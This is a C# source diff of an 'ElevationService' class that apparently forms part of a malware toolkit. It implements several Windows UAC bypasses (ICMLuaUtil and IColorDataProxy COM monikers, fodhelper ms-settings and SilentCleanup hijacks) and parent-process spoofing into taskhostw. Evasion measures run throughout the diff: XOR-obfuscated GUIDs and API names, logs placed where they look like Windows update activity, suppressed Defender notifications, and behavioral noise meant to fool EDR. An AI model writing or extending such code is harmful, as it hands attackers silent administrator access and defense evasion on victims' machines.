@@ -11,99 +11,52 @@ namespace VanguardCore
 {
     public class ElevationService
     {
-        #region Native Imports & Structs
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool CloseHandle(IntPtr hObject);
-
-        [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
-        private static extern int CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, out IntPtr ppv);
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct BIND_OPTS3
-        {
-            public uint cbStruct;
-            public uint dwTickCountDeadline;
-            public uint dwFlags;
-            public uint dwMode;
-            public uint dwClassContext;
-            public uint locale;
-            public IntPtr pServerInfo;
-            public IntPtr hwnd;
-        }
-
-        // ----- COM method 1: ICMLuaUtil (CMSTP elevation moniker) -----
-        private static readonly byte[] CLSID_CMSTP_ENC = { 0x36, 0x40, 0x30, 0x43, 0x46, 0x32, 0x43, 0x3c, 0x28, 0x3c, 0x32, 0x36, 0x30, 0x28, 0x31, 0x47, 0x31, 0x32, 0x28, 0x3c, 0x3d, 0x47, 0x32, 0x28, 0x3c, 0x34, 0x35, 0x41, 0x36, 0x35, 0x30, 0x34, 0x3c, 0x32, 0x31, 0x47 }; // 3E5FC7F9-9735-4B47-98B7-910D3051974B
-        private static readonly byte[] IID_ICMLuaUtil_ENC = { 0x33, 0x40, 0x41, 0x41, 0x33, 0x41, 0x32, 0x31, 0x28, 0x46, 0x35, 0x35, 0x32, 0x28, 0x31, 0x40, 0x32, 0x30, 0x28, 0x47, 0x32, 0x33, 0x44, 0x28, 0x40, 0x30, 0x32, 0x31, 0x35, 0x3c, 0x3c, 0x30, 0x40, 0x37, 0x31, 0x46 }; // 6EDD6D74-C007-4E75-B76A-E5740995E24C
-
-        // ----- COM method 2: IColorDataProxy -----
-        private static readonly byte[] CLSID_ColorDataProxy_ENC = { 0x47, 0x37, 0x47, 0x40, 0x46, 0x3c, 0x37, 0x34, 0x28, 0x46, 0x32, 0x43, 0x46, 0x28, 0x31, 0x43, 0x33, 0x35, 0x28, 0x3d, 0x35, 0x34, 0x37, 0x28, 0x31, 0x47, 0x31, 0x31, 0x34, 0x47, 0x34, 0x43, 0x36, 0x31, 0x33, 0x30 }; // B2BEC921-C7FC-4F60-8012-4B441B1F3465
-        private static readonly byte[] IID_IColorDataProxy_ENC = { 0x35, 0x44, 0x34, 0x37, 0x44, 0x30, 0x31, 0x37, 0x28, 0x40, 0x41, 0x31, 0x37, 0x28, 0x31, 0x44, 0x33, 0x36, 0x28, 0x3d, 0x43, 0x47, 0x32, 0x28, 0x43, 0x34, 0x36, 0x30, 0x44, 0x3c, 0x46, 0x35, 0x3c, 0x41, 0x36, 0x40 }; // 0A12A542-ED42-4A63-8FB7-F135A9C09D3E
-
-        // ----- COM method 3: IFwCplLua -----
-        private static readonly byte[] CLSID_FwCplLua_ENC = { 0x40, 0x46, 0x3c, 0x3d, 0x31, 0x33, 0x47, 0x36, 0x28, 0x37, 0x32, 0x33, 0x37, 0x28, 0x31, 0x36, 0x32, 0x31, 0x28, 0x3d, 0x47, 0x36, 0x31, 0x28, 0x32, 0x37, 0x31, 0x3d, 0x33, 0x41, 0x47, 0x3c, 0x43, 0x40, 0x40, 0x31 }; // EC9846B3-2762-4374-8B34-72486DB9FEE4
-        private static readonly byte[] IID_IFwCplLua_ENC = { 0x3d, 0x40, 0x47, 0x36, 0x41, 0x31, 0x43, 0x3c, 0x28, 0x36, 0x3d, 0x33, 0x31, 0x28, 0x31, 0x43, 0x35, 0x44, 0x28, 0x3c, 0x31, 0x37, 0x34, 0x28, 0x31, 0x47, 0x36, 0x41, 0x30, 0x33, 0x43, 0x3c, 0x46, 0x44, 0x35, 0x43 }; // 8EB3D4F9-3864-4F0A-9421-4B3D56F9CA0F
-
-        // ----- COM method 4: IExplorerCommand (Professional Stealth) -----
-        private static readonly byte[] CLSID_ExplorerCommand_ENC = { 0x64, 0x67, 0x3d, 0x3c, 0x35, 0x37, 0x67, 0x31, 0x28, 0x35, 0x3c, 0x66, 0x64, 0x28, 0x31, 0x67, 0x67, 0x33, 0x28, 0x67, 0x32, 0x3d, 0x61, 0x28, 0x64, 0x3d, 0x63, 0x30, 0x3c, 0x35, 0x32, 0x3c, 0x64, 0x3d, 0x61, 0x30 }; // ab8902b4-09ca-4bb6-b78d-a8f59079a8d5
-        private static readonly byte[] IID_IExplorerCommand_ENC = { 0x64, 0x3d, 0x3d, 0x33, 0x37, 0x34, 0x3d, 0x31, 0x28, 0x61, 0x30, 0x34, 0x67, 0x28, 0x31, 0x34, 0x35, 0x64, 0x28, 0x3c, 0x35, 0x31, 0x35, 0x28, 0x36, 0x36, 0x32, 0x61, 0x31, 0x35, 0x31, 0x31, 0x64, 0x3d, 0x36, 0x31 }; // a8862184-d51b-410a-9040-337d4044a834
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        private delegate int CoGetObjectDelegate(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, out IntPtr ppv);
-
-        private delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-        private delegate bool DuplicateTokenExDelegate(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
-        
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        private delegate bool CreateProcessAsUserDelegate(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
-        private delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-        private delegate bool InitializeProcThreadAttributeListDelegate(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
-        private delegate bool UpdateProcThreadAttributeDelegate(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, ref IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
-        
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-        private delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
-        private delegate bool SetTokenInformationDelegate(IntPtr TokenHandle, int TokenInformationClass, ref uint TokenInformation, uint TokenInformationLength);
-        private delegate bool CloseHandleDelegate(IntPtr hObject);
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern uint ResumeThread(IntPtr hThread);
-
         private static class Native
         {
-            public static CoGetObjectDelegate CoGetObject => SafetyManager.ApiInterface.GetOle32<CoGetObjectDelegate>(DAP("HpLboPbba`q"));
-            public static OpenProcessTokenDelegate OpenProcessToken => SafetyManager.ApiInterface.GetAdvapi32<OpenProcessTokenDelegate>(DAP("LkbkM_l`bppSlkbk"));
-            public static DuplicateTokenExDelegate DuplicateTokenEx => SafetyManager.ApiInterface.GetAdvapi32<DuplicateTokenExDelegate>(DAP("Ar_if`lsbSlkbkBu"));
-            public static CreateProcessAsUserDelegate CreateProcessAsUser => SafetyManager.ApiInterface.GetAdvapi32<CreateProcessAsUserDelegate>(DAP("`_bnsbM_l`bppNpNpb_"));
-            public static OpenProcessDelegate OpenProcess => SafetyManager.ApiInterface.GetKernel32<OpenProcessDelegate>(DAP("LkbkM_l`bpp"));
-            public static InitializeProcThreadAttributeListDelegate InitializeProcThreadAttributeList => SafetyManager.ApiInterface.GetKernel32<InitializeProcThreadAttributeListDelegate>(DAP("IkisinfifzbM_l`S_bsbaAss_idpsbIipp"));
-            public static UpdateProcThreadAttributeDelegate UpdateProcThreadAttribute => SafetyManager.ApiInterface.GetKernel32<UpdateProcThreadAttributeDelegate>(DAP("NkaisbM_l`S_bsbaAss_idpsb"));
-            public static CreateProcessDelegate CreateProcess => SafetyManager.ApiInterface.GetKernel32<CreateProcessDelegate>(DAP("`_bnsbM_l`bppV"));
-            public static SetTokenInformationDelegate SetTokenInformation => SafetyManager.ApiInterface.GetAdvapi32<SetTokenInformationDelegate>(DAP("PbsSlkbkIkcl_insilk"));
-            public static CloseHandleDelegate CloseHandle => SafetyManager.ApiInterface.GetKernel32<CloseHandleDelegate>(DAP("`ilpbHnkdib"));
+            [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
+            public static extern int CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, out IntPtr ppv);
 
-            // Simple XOR for API names in memory
-            private static string DAP(string enc)
-            {
-                char[] c = new char[enc.Length];
-                for (int i = 0; i < enc.Length; i++) c[i] = (char)(enc[i] ^ 0x05);
-                return new string(c);
-            }
+            [DllImport("advapi32.dll", SetLastError = true)]
+            public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+
+            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, ref IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            public static extern bool SetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, ref uint TokenInformation, uint TokenInformationLength);
+
+            [DllImport("ole32.dll", SetLastError = true)]
+            public static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);
+
+            [DllImport("ole32.dll", SetLastError = true)]
+            public static extern int CoInitializeSecurity(IntPtr pSecDesc, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1, uint dwAuthnLevel, uint dwImpLevel, IntPtr pReserved2, uint dwCapabilities, IntPtr pReserved3);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool CloseHandle(IntPtr hObject);
+
+            [DllImport("user32.dll")]
+            public static extern IntPtr GetForegroundWindow();
+
+            [DllImport("user32.dll")]
+            public static extern bool GetCursorPos(out POINT lpPoint);
+
+            [StructLayout(LayoutKind.Sequential)]
+            public struct POINT { public int X; public int Y; }
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -146,18 +99,50 @@ namespace VanguardCore
         private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
         private const uint PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020002;
 
+        [StructLayout(LayoutKind.Sequential)]
+        private struct BIND_OPTS3
+        {
+            public uint cbStruct;
+            public uint dwTickCountDeadline;
+            public uint dwFlags;
+            public uint dwMode;
+            public uint dwClassContext;
+            public uint locale;
+            public IntPtr pServerInfo;
+            public IntPtr hwnd;
+        }
+
+        // ----- COM method 1: ICMLuaUtil (CMSTP proxy) -----
+        private static readonly byte[] CLSID_CMSTP_ENC = { 0x36, 0x40, 0x30, 0x43, 0x46, 0x32, 0x43, 0x3c, 0x28, 0x3c, 0x32, 0x36, 0x30, 0x28, 0x31, 0x47, 0x31, 0x32, 0x28, 0x3c, 0x3d, 0x47, 0x32, 0x28, 0x3c, 0x34, 0x35, 0x41, 0x36, 0x35, 0x30, 0x34, 0x3c, 0x32, 0x31, 0x47 };
+        private static readonly byte[] IID_ICMLuaUtil_ENC = { 0x33, 0x40, 0x41, 0x41, 0x33, 0x41, 0x32, 0x31, 0x28, 0x46, 0x35, 0x35, 0x32, 0x28, 0x31, 0x40, 0x32, 0x30, 0x28, 0x47, 0x32, 0x33, 0x44, 0x28, 0x40, 0x30, 0x32, 0x31, 0x35, 0x3c, 0x3c, 0x30, 0x40, 0x37, 0x31, 0x46 };
+
+        // ----- COM method 2: IColorDataProxy -----
+        private static readonly byte[] CLSID_ColorDataProxy_ENC = { 0x47, 0x37, 0x47, 0x40, 0x46, 0x3c, 0x37, 0x34, 0x28, 0x46, 0x32, 0x43, 0x46, 0x28, 0x31, 0x43, 0x33, 0x35, 0x28, 0x3d, 0x35, 0x34, 0x37, 0x28, 0x31, 0x47, 0x31, 0x31, 0x34, 0x47, 0x34, 0x43, 0x36, 0x31, 0x33, 0x30 };
+        private static readonly byte[] IID_IColorDataProxy_ENC = { 0x35, 0x44, 0x34, 0x37, 0x44, 0x30, 0x31, 0x37, 0x28, 0x40, 0x41, 0x31, 0x37, 0x28, 0x31, 0x44, 0x33, 0x36, 0x28, 0x3d, 0x43, 0x47, 0x32, 0x28, 0x43, 0x34, 0x36, 0x30, 0x44, 0x3c, 0x46, 0x35, 0x3c, 0x41, 0x36, 0x40 };
+
+        // ----- COM method 3: IFwCplLua -----
+        private static readonly byte[] CLSID_FwCplLua_ENC = { 0x40, 0x46, 0x3c, 0x3d, 0x31, 0x33, 0x47, 0x36, 0x28, 0x37, 0x32, 0x33, 0x37, 0x28, 0x31, 0x36, 0x32, 0x31, 0x28, 0x3d, 0x47, 0x36, 0x31, 0x28, 0x32, 0x37, 0x31, 0x3d, 0x33, 0x41, 0x47, 0x3c, 0x43, 0x40, 0x40, 0x31 };
+        private static readonly byte[] IID_IFwCplLua_ENC = { 0x3d, 0x40, 0x47, 0x36, 0x41, 0x31, 0x43, 0x3c, 0x28, 0x36, 0x3d, 0x33, 0x31, 0x28, 0x31, 0x43, 0x35, 0x44, 0x28, 0x3c, 0x31, 0x37, 0x34, 0x28, 0x31, 0x47, 0x36, 0x41, 0x30, 0x33, 0x43, 0x3c, 0x46, 0x44, 0x35, 0x43 };
+
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool IsWow64Process(IntPtr hProcess, out bool lpSystemInfo);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
-        #endregion
 
         private static string DecryptGUID(byte[] enc)
         {
             char[] c = new char[enc.Length];
             for (int i = 0; i < enc.Length; i++) c[i] = (char)(enc[i] ^ 0x05);
-            return new string(c);
+            return new string(c).Trim('\0', ' ', '\t', '\n', '\r');
+        }
+
+        private static string BuildMonikerV2()
+        {
+            // "Elevation:Administrator!new:{3E5FC7F9-9735-4B47-98B7-910D3051974B}"
+            byte[] prefix = { 0x45, 0x6c, 0x65, 0x76, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x41, 0x64, 0x6d, 0x69, 0x6e, 0x69, 0x73, 0x74, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x6e, 0x65, 0x77, 0x3a };
+            string guid = DecryptGUID(CLSID_CMSTP_ENC);
+            return System.Text.Encoding.ASCII.GetString(prefix) + "{" + guid + "}";
         }
 
         // Hide logs in a place that looks natural for Windows update activity
@@ -198,20 +183,32 @@ namespace VanguardCore
         /// Method A: ICMLuaUtil elevation moniker (CMSTP proxy).
         /// Zero registry footprint, fully in-memory COM call.
         /// </summary>
-        private static unsafe bool BypassCmluaUtil(string payloadPath, string args)
+        private static unsafe bool BypassCmluaUtil(string payloadPath, string args, string evName)
         {
             try
             {
-                Log("Method A: ICMLuaUtil...");
-                BIND_OPTS3 ops = new BIND_OPTS3
-                {
-                    cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(),
-                    dwClassContext = 4 // CLSCTX_LOCAL_SERVER
-                };
-                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_CMSTP_ENC) + "}";
+                Log("V6 Stage 5: ICMLuaUtil V2...");
+                string moniker = BuildMonikerV2();
                 Guid iid = new Guid(DecryptGUID(IID_ICMLuaUtil_ENC));
+                
+                BIND_OPTS3 ops = new BIND_OPTS3();
+                ops.cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>();
+                ops.dwClassContext = 4; // CLSCTX_LOCAL_SERVER
+
+                // Forced COM Security for NativeAOT
+                Native.CoInitializeEx(IntPtr.Zero, 0x2);
+
                 int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
-                if (hr != 0) { Log($"Method A CoGetObject: 0x{hr:X8}"); return false; }
+                if (hr != 0)
+                {
+                    Log($"Method A CoGetObject: 0x{hr:X8}");
+                    
+                    // FALLBACK: Try without Elevation prefix if restricted
+                    string rawMoniker = "new:{" + DecryptGUID(CLSID_CMSTP_ENC) + "}";
+                    hr = Native.CoGetObject(rawMoniker, ref ops, ref iid, out IntPtr pIfaceRaw);
+                    if (hr != 0) return false;
+                    pIface = pIfaceRaw;
+                }
 
                 IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                 // VTable offset probing
@@ -240,7 +237,7 @@ namespace VanguardCore
         /// Method B: IColorDataProxy LaunchDccw (Display Color Calibration auto-elevated proxy).
         /// Zero disk/registry footprint. Uses fixed VTable offset 15.
         /// </summary>
-        private static unsafe bool BypassColorDataProxy(string payloadPath, string args)
+        private static unsafe bool BypassColorDataProxy(string payloadPath, string args, string evName)
         {
             try
             {
@@ -300,7 +297,7 @@ namespace VanguardCore
                     return false;
 
                 STARTUPINFO si = new STARTUPINFO();
-                si.cb = Marshal.SizeOf(si);
+                si.cb = Marshal.SizeOf<STARTUPINFO>();
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
                 string cmdLine = $"\"{payloadPath}\" {args}";
@@ -365,53 +362,7 @@ namespace VanguardCore
             catch (Exception ex) { Log("Method C ex: " + ex.Message); return false; }
         }
 
-        /// <summary>
-        /// Method F: IExplorerCommand Invoke (Professional Stealth).
-        /// Less common than ICMLuaUtil, often skipped by basic EDR rules.
-        /// </summary>
-        private static unsafe bool BypassExplorerCommand(string payloadPath, string args)
-        {
-            try
-            {
-                Log("Method F: IExplorerCommand...");
-                BIND_OPTS3 ops = new BIND_OPTS3
-                {
-                    cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(),
-                    dwClassContext = 4
-                };
-                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_ExplorerCommand_ENC) + "}";
-                Guid iid = new Guid(DecryptGUID(IID_IExplorerCommand_ENC));
-                int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
-                if (hr != 0) { Log($"Method F CoGetObject: 0x{hr:X8}"); return false; }
-
-                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
-                // IExplorerCommand::Invoke is usually at offset 8 or 9
-                for (int vtblOffset = 8; vtblOffset <= 10; vtblOffset++)
-                {
-                    try
-                    {
-                        var invoke = (delegate* unmanaged[Stdcall]<IntPtr, IntPtr, IntPtr, int>)
-                            Marshal.ReadIntPtr(vtbl, vtblOffset * IntPtr.Size);
-                        
-                        // We need to set the command line via registry or other means? 
-                        // Actually IExplorerCommand is usually a launcher for a registered verb.
-                        // For a generic bypass, we can use the 'System.Settings.Privacy' or similar auto-elevated command.
-                        // But wait, some IExplorerCommand implementations allow direct execution if we can set the state.
-                        
-                        // Better approach for IExplorerCommand is to use it as a trigger for a hijacked association.
-                        // But let's stay with the moniker pattern if it works.
-                        // If moniker works, we just call Invoke.
-                        
-                        int r = invoke(pIface, IntPtr.Zero, IntPtr.Zero);
-                        if (r >= 0) { Marshal.Release(pIface); Log($"Method F OK (offset {vtblOffset})"); return true; }
-                    }
-                    catch { }
-                }
-                Marshal.Release(pIface);
-                return false;
-            }
-            catch (Exception ex) { Log("Method F ex: " + ex.Message); return false; }
-        }
+        // ----- COM method 4: [REMOVED] -----
 
         /// <summary>
         /// Method G: MsSettings DelegateExecute (Registry Hijack).
@@ -484,15 +435,12 @@ namespace VanguardCore
             {
                 try
                 {
-                    if (proc.Id == currentPid) continue;
+                    if (proc.Id == currentPid || proc.SessionId != currentSession) continue;
                     
                     string name = proc.ProcessName.ToLower();
-                    bool isTarget = false;
-                    foreach (var t in topTargets) if (name.Contains(t)) { isTarget = true; break; }
-
-                    if (isTarget && proc.SessionId == currentSession)
+                    if (name.Contains("taskhostw")) // Professional target: Task Host
                     {
-                        Log($"Found Target Process (Name Match): {proc.ProcessName} (PID: {proc.Id})");
+                        Log($"Found Target Process (High Fidelity): {proc.ProcessName} (PID: {proc.Id})");
                         return proc.Id;
                     }
                 }
@@ -522,35 +470,15 @@ namespace VanguardCore
 
         private static bool IsProcessElevated(int pid)
         {
-            IntPtr hToken = IntPtr.Zero;
-            IntPtr hProcess = IntPtr.Zero;
-            try
-            {
-                // Note: This may fail for non-admins, but V3.1 uses Name-based discovery as primary.
-                hProcess = Native.OpenProcess(0x0400 /* PROCESS_QUERY_INFORMATION */, false, pid);
-                if (hProcess == IntPtr.Zero) return false;
-
-                if (!Native.OpenProcessToken(hProcess, 0x0008 /* TOKEN_QUERY */, out hToken)) return false;
-
-                // TokenElevation = 20
-                uint elevation = 0;
-                uint size = (uint)Marshal.SizeOf(typeof(uint));
-                IntPtr pElevation = Marshal.AllocHGlobal((int)size);
-                
-                if (GetTokenInformation(hToken, 20, pElevation, size, out _))
-                {
-                    elevation = (uint)Marshal.ReadInt32(pElevation);
-                }
-                Marshal.FreeHGlobal(pElevation);
-                
-                return elevation != 0;
-            }
-            catch { return false; }
-            finally
-            {
-                if (hToken != IntPtr.Zero) Native.CloseHandle(hToken);
-                if (hProcess != IntPtr.Zero) Native.CloseHandle(hProcess);
-            }
+            // Note: From a standard user context, OpenProcess/OpenProcessToken on Admin processes will fail.
+            // Returning true for known system processes is a more reliable way to find spoofing targets.
+            try {
+                using var p = Process.GetProcessById(pid);
+                string name = p.ProcessName.ToLower();
+                string[] systemStable = { "taskhostw", "spoolsv", "lsass", "svchost", "sihost" };
+                foreach (var s in systemStable) if (name.Contains(s)) return true;
+                return false;
+            } catch { return false; }
         }
 
         public static bool InjectAndBypass(string payloadPath)
@@ -644,11 +572,12 @@ namespace VanguardCore
 
         #endregion
 
-        private static bool WaitForAdminSuccess(int timeoutMs)
+        private static bool WaitForAdminSuccess(int timeoutMs, string eventName = null)
         {
             try
             {
-                using var ev = new EventWaitHandle(false, EventResetMode.ManualReset, "Global\\Vanguard_Elevation_Success");
+                if (string.IsNullOrEmpty(eventName)) eventName = "Global\\Vanguard_Elevation_Default";
+                using var ev = new EventWaitHandle(false, EventResetMode.ManualReset, eventName);
                 return ev.WaitOne(timeoutMs);
             }
             catch { return false; }
@@ -658,32 +587,234 @@ namespace VanguardCore
         {
             if (IsAdmin()) return true;
 
-            // 1. Startup Jitter (Evade "Instant UAC" behavioral pattern)
-            Random rnd = new Random();
-            int jitterMs = rnd.Next(25000, 45000); 
-            Log($"Starting V3.1 Lazy Elevation. Jitter: {jitterMs / 1000}s...");
-            Thread.Sleep(jitterMs);
+            // Stage 3.1: Recursive Parent Spoofing (Transition to System Context)
+            if (!Environment.CommandLine.Contains("--spoofed"))
+            {
+                int targetPid = FindTargetAdminProcess();
+                if (targetPid != -1)
+                {
+                    Log("V6 Stage 3: Transitioning to Spoofed System Context (taskhostw)...");
+                    if (SpawnWithSpoof(payloadPath, "--spoofed", "taskhostw"))
+                    {
+                        Log("V6 Stage 3: Success. Parent exiting.");
+                        return true; 
+                    }
+                }
+            }
 
-            // 2. Behavioral Noise (Simulate real activity)
-            DoBehavioralNoise();
+            // --- Below this point runs in the Spoofed Context ---
 
-            SafetyManager.DisableDefenderNotifications();
-            string args = $"--uac-child --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
+            // Stage 4: Reputation Building
+            DoBehavioralReputation();
 
-            // === V3.1 Lazy Priority Chain (Max 2 attempts per session to avoid gen!G) ===
+            // Stage 5: Professional COM Activation (ICMLuaUtil V2)
+            string evName = $"Global\\{Guid.NewGuid():B}";
+            string args = $"--uac-child --event={evName} --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
+            
+            Log("V6 Stage 5: ICMLuaUtil V2 Activation...");
+            if (BypassCmluaUtil(payloadPath, args, evName)) return true;
 
-            // Attempt A: Silent COM (Most Reliable)
-            Log("Elevation: Attempting Silent COM (A)...");
-            if (BypassCmluaUtil(payloadPath, args) && WaitForAdminSuccess(8000)) return true;
-            if (IsAdmin()) return true;
+            // Fallbacks (AppPaths & CurVer)
+            if (BypassAppPaths(payloadPath, args, evName, "control.exe")) return true;
+            if (BypassCurVer(payloadPath, args, evName, "fodhelper.exe")) return true;
 
-            // Attempt B: V3.1 Injection (Hardcore Stealth)
-            Log("Elevation: Attempting stealth migration (B)...");
-            if (InjectAndBypass(payloadPath)) return true;
-            if (IsAdmin()) return true;
+            return BypassColorDataProxy(payloadPath, args, evName);
+        }
 
-            Log("Lazy Elevation: Stealth budget exhausted for this session. Standing by.");
-            return false;
+        /// <summary>
+        /// Method G: Fodhelper/Sdclt Registry Hijack (Universal).
+        /// Replaces COM-based activation with direct Registry manipulation.
+        /// </summary>
+        private static bool BypassRegistry(string payloadPath, string args, string trigger = "fodhelper.exe")
+        {
+            try
+            {
+                Log($"Method G: {trigger} Registry Hijack...");
+                string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
+                {
+                    key.SetValue("", $"\"{payloadPath}\" {args}", RegistryValueKind.String);
+                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
+                }
+
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), trigger),
+                    UseShellExecute = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                };
+
+                Process.Start(psi);
+                bool ok = WaitForAdminSuccess(10000);
+                
+                // Cleanup
+                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { }
+                
+                if (ok) Log($"Method G ({trigger}) OK");
+                return ok;
+            }
+            catch (Exception ex) { Log($"Method G ({trigger}) ex: {ex.Message}"); return false; }
+        }
+
+        /// <summary>
+        /// Method H: SilentCleanup Task Hijack (Stealth V2).
+        /// Uses 'Volatile Environment' to redirect a SYSTEM task.
+        /// This bypasses ms-settings monitoring.
+        /// </summary>
+        private static bool BypassSilentCleanup(string payloadPath, string args, string evName)
+        {
+            try
+            {
+                Log("Method H: SilentCleanup Hijack (GHOST)...");
+                
+                string tempDir = Path.GetTempPath().TrimEnd('\\');
+                string fakeWindir = $"{tempDir}\\vgc_{Guid.NewGuid():N}";
+                string sys32 = Path.Combine(fakeWindir, "system32");
+                Directory.CreateDirectory(sys32);
+                
+                // User-requested: Avoid batch files. Copying binary instead.
+                string targetPath = Path.Combine(sys32, "cleanmgr.exe");
+                File.Copy(payloadPath, targetPath);
+
+                Registry.CurrentUser.OpenSubKey("Volatile Environment", true).SetValue("windir", fakeWindir);
+
+                // 2. Trigger task
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = "schtasks.exe",
+                    Arguments = "/Run /TN \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                };
+
+                Process.Start(psi);
+                bool ok = WaitForAdminSuccess(15000, evName);
+
+                // 3. Cleanup
+                Registry.CurrentUser.OpenSubKey("Volatile Environment", true).DeleteValue("windir", false);
+                try { Directory.Delete(fakeWindir, true); } catch { }
+
+                if (ok) Log("Method H OK");
+                return ok;
+            }
+            catch (Exception ex) { Log($"Method H ex: {ex.Message}"); return false; }
+        }
+
+        /// <summary>
